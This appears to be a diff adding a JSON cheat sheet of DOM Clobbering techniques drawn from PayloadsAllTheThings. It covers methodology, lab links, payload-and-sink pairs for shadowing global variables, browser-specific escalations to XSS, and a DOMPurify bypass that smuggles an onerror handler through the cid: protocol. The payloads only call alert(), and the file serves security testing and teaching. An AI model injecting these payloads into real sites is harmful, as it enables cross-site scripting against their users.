@@ -1,0 +1,112 @@
+{
+  "category": "DOM Clobbering",
+  "source": "PayloadsAllTheThings/DOM Clobbering/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What DOM Clobbering is",
+      "language": "text",
+      "tags": ["methodology", "dom-clobbering"],
+      "body": "DOM Clobbering is a technique in which global variables are overwritten (\"clobbered\") by means of HTML elements with specific id or name attributes.\nThe browser automatically creates references to named elements on window and document, and these references shadow the values the script expects.\nThis breaks the logic of scripts and can lead to vulnerabilities when a script reads a \"variable\" that is actually substituted by our HTML."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Where it applies - an HTML injection without scripts is needed",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "Exploitation requires any HTML injection on the page (not full-fledged JS).\nThe classic scenario: a filter/sanitizer strips <script> and event handlers but lets through \"harmless\" tags (a, form, input, iframe, base, img...).\nThe goal is to slip in elements with the right id/name so that the page's script reads a controlled value from them (a sink of the form x, x.y, x.y.value, etc.)."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Tools and resources",
+      "language": "text",
+      "tags": ["tools"],
+      "body": "SoheilKhodayari/DOMClobbering (domclob.xyz) - a large list of DOM Clobbering payloads for different browsers (desktop/mobile).\nyeswehack/Dom-Explorer - a web tool for testing various HTML parsers and sanitizers; it shows how the browser parses HTML and helps find mutation XSS."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Practice labs (PortSwigger)",
+      "language": "text",
+      "tags": ["labs", "practice"],
+      "body": "• Exploiting DOM clobbering to enable XSS\n• Clobbering DOM attributes to bypass HTML filters\n• DOM clobbering test case protected by CSP\nLinks: portswigger.net/web-security/dom-based/dom-clobbering/"
+    },
+
+    {
+      "subcategory": "Clobbering via id/name",
+      "title": "Clobbering x.y.value (form + output)",
+      "language": "html",
+      "tags": ["clobbering", "id", "value"],
+      "body": "// Payload\n<form id=x><output id=y>I've been clobbered</output>\n\n// Sink\n<script>alert(x.y.value);</script>"
+    },
+    {
+      "subcategory": "Clobbering via id/name",
+      "title": "Clobbering x.y via id + name (DOM collection)",
+      "language": "html",
+      "tags": ["clobbering", "htmlcollection", "anchor"],
+      "body": "// Payload\n<a id=x><a id=x name=y href=\"Clobbered\">\n\n// Sink\n<script>alert(x.y)</script>"
+    },
+    {
+      "subcategory": "Clobbering via id/name",
+      "title": "Clobbering document.getElementById() via <html>/<body>",
+      "language": "html",
+      "tags": ["clobbering", "getelementbyid", "id"],
+      "body": "// Payloads\n<html id=\"cdnDomain\">clobbered</html>\n<svg><body id=cdnDomain>clobbered</body></svg>\n\n\n// Sink \n<script>\nalert(document.getElementById('cdnDomain').innerText);//clobbbered\n</script>"
+    },
+
+    {
+      "subcategory": "Nested properties",
+      "title": "Clobbering x.y.z - 3 levels of nesting",
+      "language": "html",
+      "tags": ["clobbering", "nested", "form"],
+      "body": "// Payload\n<form id=x name=y><input id=z></form>\n<form id=x></form>\n\n// Sink\n<script>alert(x.y.z)</script>"
+    },
+    {
+      "subcategory": "Nested properties",
+      "title": "Clobbering a.b.c.d - more than 3 levels (nested iframe srcdoc)",
+      "language": "html",
+      "tags": ["clobbering", "nested", "iframe", "srcdoc"],
+      "body": "// Payload\n<iframe name=a srcdoc=\"\n<iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>\"></iframe>\n<style>@import '//portswigger.net';</style>\n\n// Sink\n<script>alert(a.b.c.d)</script>"
+    },
+    {
+      "subcategory": "Nested properties",
+      "title": "Clobbering x.username and x.password (URL parsing of href)",
+      "language": "html",
+      "tags": ["clobbering", "anchor", "username"],
+      "body": "// Payload\n<a id=x href=\"ftp:Clobbered-username:Clobbered-Password@a\">\n\n// Sink\n<script>\nalert(x.username)//Clobbered-username\nalert(x.password)//Clobbered-password\n</script>"
+    },
+
+    {
+      "subcategory": "HTMLCollection tricks",
+      "title": "Clobbering forEach (Chrome only)",
+      "language": "html",
+      "tags": ["clobbering", "htmlcollection", "foreach", "chrome"],
+      "body": "// Payload\n<form id=x>\n<input id=y name=z>\n<input id=y>\n</form>\n\n// Sink\n<script>x.y.forEach(element=>alert(element))</script>"
+    },
+
+    {
+      "subcategory": "Escalation to XSS",
+      "title": "Clobbering a value via href (Firefox only)",
+      "language": "html",
+      "tags": ["clobbering", "href", "firefox", "xss"],
+      "body": "// Payload\n<base href=a:abc><a id=x href=\"Firefox<>\">\n\n// Sink\n<script>\nalert(x)//Firefox<>\n</script>"
+    },
+    {
+      "subcategory": "Escalation to XSS",
+      "title": "Clobbering x.xyz via base href (Chrome only)",
+      "language": "html",
+      "tags": ["clobbering", "base", "href", "chrome"],
+      "body": "// Payload\n<base href=\"a://Clobbered<>\"><a id=x name=x><a id=x name=xyz href=123>\n\n// Sink\n<script>\nalert(x.xyz)//a://Clobbered<>\n</script>"
+    },
+
+    {
+      "subcategory": "Sanitizer bypass (DOMPurify)",
+      "title": "DOMPurify bypass via the cid: protocol (double quote is not encoded)",
+      "language": "html",
+      "tags": ["bypass", "dompurify", "cid", "xss"],
+      "body": "<a id=defaultAvatar><a id=defaultAvatar name=avatar href=\"cid:&quot;onerror=alert(1)//\">",
+      "meta": {
+        "tip": "DOMPurify allows the cid: protocol, which does not encode the double quote (\"). This lets you break out of the href attribute and smuggle onerror=alert(1) when the value is later inserted into the markup."
+      }
+    }
+  ]
+}
